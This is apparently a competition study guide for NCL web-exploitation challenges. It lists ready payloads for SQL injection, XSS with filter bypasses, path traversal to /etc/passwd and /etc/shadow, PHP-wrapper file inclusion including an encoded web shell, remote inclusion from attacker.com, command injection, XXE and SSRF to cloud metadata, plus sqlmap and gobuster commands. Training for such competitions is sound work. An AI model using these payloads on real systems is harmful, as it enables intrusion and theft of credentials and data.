# NCL Web Exploitation Guide

## Common Web Vulnerabilities in NCL

### 1. SQL Injection (SQLi)

SQL injection occurs when user input is improperly sanitized in SQL queries.

**Types:**
- **Error-based**: Trigger errors to reveal database info
- **Union-based**: Use UNION to combine results
- **Boolean-based**: Infer data from true/false responses
- **Time-based**: Use delays to confirm injection

**Common Payloads:**
```sql
' OR '1'='1
' OR 1=1--
' UNION SELECT null, username, password FROM users--
admin'--
1' ORDER BY 1--
```

**Testing:**
1. Try single quote `'` to see if error occurs
2. Comment out rest of query with `--` or `#`
3. Use UNION to extract data
4. Enumerate tables with information_schema

**Tools:**
- SQLmap (automated)
- Burp Suite
- Manual testing with curl

**Example:**
```bash
# Basic SQLi test
curl "http://target.com/search?id=1' OR '1'='1"

# SQLmap
sqlmap -u "http://target.com/search?id=1" --dbs
```

### 2. Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages.

**Types:**
- **Reflected**: Script in URL/input, reflected immediately
- **Stored**: Script saved in database, executed later
- **DOM-based**: Manipulation of DOM by client-side scripts

**Common Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

**Bypass Filters:**
```html
<sCrIpT>alert(1)</ScRiPt>  # Case variation
<script>alert(String.fromCharCode(88,83,83))</script>  # Encoding
<img src=x onerror="alert('XSS')">  # Event handlers
```

### 3. Directory Traversal / Path Traversal

Access files outside the intended directory.

**Payloads:**
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd  # URL encoded
..%252f..%252f..%252fetc%252fpasswd  # Double encoded
```

**Common Targets:**
- `/etc/passwd` (Linux users)
- `/etc/shadow` (Linux passwords)
- `C:\Windows\System32\drivers\etc\hosts` (Windows)
- Application config files
- Source code files

### 4. Local File Inclusion (LFI)

Include files from the local server.

**Example:**
```
http://target.com/page.php?file=../../../../etc/passwd
http://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php
```

**PHP Wrappers:**
```
php://filter/convert.base64-encode/resource=index.php
php://input  # POST data as PHP code
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### 5. Remote File Inclusion (RFI)

Include files from remote servers.

**Example:**
```
http://target.com/page.php?file=http://attacker.com/shell.php
```

### 6. Command Injection

Execute arbitrary system commands.

**Payloads:**
```bash
; ls
| whoami
& cat /etc/passwd
`id`
$(whoami)
```

**Chaining Commands:**
```bash
127.0.0.1; cat flag.txt
127.0.0.1 && whoami
127.0.0.1 | ls -la
```

### 7. Authentication Bypass

**Techniques:**
- SQL injection in login forms
- Predictable session tokens
- Cookie manipulation
- Default credentials
- Weak password reset

**Common Tests:**
```
Username: admin' OR '1'='1
Password: anything
```

### 8. XML External Entity (XXE)

Exploit XML parsers to access local files or perform SSRF.

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### 9. Insecure Direct Object Reference (IDOR)

Access resources by manipulating IDs.

**Example:**
```
http://target.com/user/profile?id=123  # Try id=124, 125, etc.
http://target.com/document/download?file=invoice_001.pdf  # Try other numbers
```

### 10. Server-Side Request Forgery (SSRF)

Make the server perform requests to internal resources.

**Payloads:**
```
http://localhost/admin
http://127.0.0.1/internal
http://169.254.169.254/latest/meta-data/  # AWS metadata
```

## Essential Tools

### Burp Suite
- Intercept and modify HTTP requests
- Repeater for testing payloads
- Intruder for automated attacks

### Browser Developer Tools
- Inspect HTML/JavaScript
- Monitor network traffic
- Modify cookies and local storage

### Command Line Tools
```bash
# cURL - Make HTTP requests
curl -X POST http://target.com/login -d "user=admin&pass=test"

# wget - Download files
wget http://target.com/file.txt

# nikto - Web scanner
nikto -h http://target.com

# dirb/gobuster - Directory bruteforce
gobuster dir -u http://target.com -w wordlist.txt
```

### Python Requests
```python
import requests

# GET request
response = requests.get('http://target.com/api')

# POST request
data = {'username': 'admin', 'password': 'test'}
response = requests.post('http://target.com/login', data=data)

# Custom headers
headers = {'User-Agent': 'Custom', 'X-Forwarded-For': '127.0.0.1'}
response = requests.get('http://target.com', headers=headers)
```

## NCL Web Tips

1. **Always check source code**
   - View page source (Ctrl+U)
   - Check JavaScript files
   - Look for commented-out code
   - Check robots.txt and sitemap.xml

2. **Test all input fields**
   - Forms
   - URL parameters
   - Cookies
   - HTTP headers
   - File uploads

3. **Look for hidden forms/fields**
   - Inspect element
   - Check for type="hidden"
   - Modify form values before submission

4. **Common NCL patterns**
   - Flags in HTML comments
   - Flags in JavaScript variables
   - Flags in HTTP headers
   - Flags in cookies
   - Flags in error messages

5. **HTTP Methods**
   - Try GET, POST, PUT, DELETE, OPTIONS
   - Some endpoints only work with specific methods

6. **Encoding**
   - URL encoding
   - Base64 encoding
   - HTML entity encoding
   - Unicode encoding

## Practice Resources

- OWASP WebGoat
- HackTheBox web challenges
- PortSwigger Web Security Academy
- DVWA (Damn Vulnerable Web Application)
- bWAPP

## Common NCL Web Challenge Solutions

### Finding Hidden Content
```bash
# Check robots.txt
curl http://target.com/robots.txt

# Directory bruteforce
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Check common files
curl http://target.com/.git/config
curl http://target.com/admin
curl http://target.com/backup
```

### Cookie Manipulation
```bash
# View cookies
document.cookie  # In browser console

# Modify cookies
document.cookie = "admin=true"
document.cookie = "role=administrator"
```

### Bypassing Client-Side Validation
```javascript
// In browser console, modify JavaScript
document.getElementById('submit').disabled = false;
document.getElementById('input').removeAttribute('maxlength');
```

Remember: Web challenges often combine multiple techniques. Start with reconnaissance, then test systematically!

